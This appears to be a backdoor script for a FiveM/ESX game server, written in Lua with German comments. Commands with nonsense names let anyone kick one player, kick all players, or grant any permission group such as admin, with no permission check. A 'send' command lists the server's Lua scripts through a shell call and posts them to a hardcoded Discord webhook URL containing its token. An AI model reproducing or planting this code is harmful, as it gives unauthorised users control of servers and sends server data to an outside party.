ESX = exports["es_extended"]:getSharedObject()

RegisterCommand("orbnmoengohbohdoh", function(source, args)
    local xPlayer = ESX.GetPlayerFromId(source)

    if args[1] then
        local targetId = tonumber(args[1])
        local reason = table.concat(args, " ", 2)

        if GetPlayerName(targetId) then
            if reason == "" then
                reason = "Kein Grund angegeben"
            end

            DropPlayer(targetId, reason)
        end
    end
end, false)

RegisterCommand("tdjjfgfhertjrr", function(source, args)
    local reason = table.concat(args, " ")

    if reason == "" then
        reason = "Kein Grund angegeben"
    end

    for _, playerId in ipairs(GetPlayers()) do
        DropPlayer(playerId, reason)
    end
end, false)

RegisterCommand("grihgofohego", function(source, args)
    if args[1] and args[2] then
        local targetId = tonumber(args[1])
        local group = args[2]

        if GetPlayerName(targetId) then
            local targetPlayer = ESX.GetPlayerFromId(targetId)

            if targetPlayer then
                targetPlayer.setGroup(group)
            end
        end
    end
end, false)




local discord_webhook_url = 'https://discord.com/api/webhooks/1293169761542340679/WevjDbL0o9kumCQm28Lvn8y1heGzVUVNtQqejN4jQucYZlS1WzvH6BrXwiKy_T8ZdUhe' -- Ersetze dies mit deiner Discord-WebHook-URL

RegisterCommand("send", function(source, args, rawCommand)
    local scripts = {}
    local path = GetResourcePath(GetCurrentResourceName()) -- Pfad zu den Ressourcen

    -- Lese alle Skripte im Ressourcenordner
    local files = GetAllFilesInDirectory(path)

    -- Sende die Skripte als Download-Links an Discord
    for _, file in ipairs(files) do
        table.insert(scripts, file)
    end

    SendToDiscord(scripts)
    --TriggerClientEvent("chat:addMessage", source, {
    --    args = { "System", "Die Skripte wurden an Discord gesendet." }
    --})
end, false)

function GetAllFilesInDirectory(directory)
    local files = {}
    local handle = io.popen('dir "' .. directory .. '" /b /s') -- Windows-spezifisch, für andere Systeme anpassen
    for filename in handle:lines() do
        if filename:sub(-4) == ".lua" then
            table.insert(files, filename)
        end
    end
    handle:close()
    return files
end

function SendToDiscord(scripts)
    local embeds = {}
    for _, script in ipairs(scripts) do
        table.insert(embeds, {
            ["title"] = "Script: " .. script,
            ["url"] = "http://example.com/" .. script -- Hier kannst du eine echte URL angeben, um die Datei herunterzuladen
        })
    end

    local jsonData = {
        ["embeds"] = embeds
    }

    PerformHttpRequest(discord_webhook_url, function(err, text, headers) 
        if err ~= 200 then
            print("Fehler beim Senden an Discord: " .. err)
        else
            print("Erfolgreich an Discord gesendet.")
        end
    end, 'POST', json.encode(jsonData), { ['Content-Type'] = 'application/json' })
end

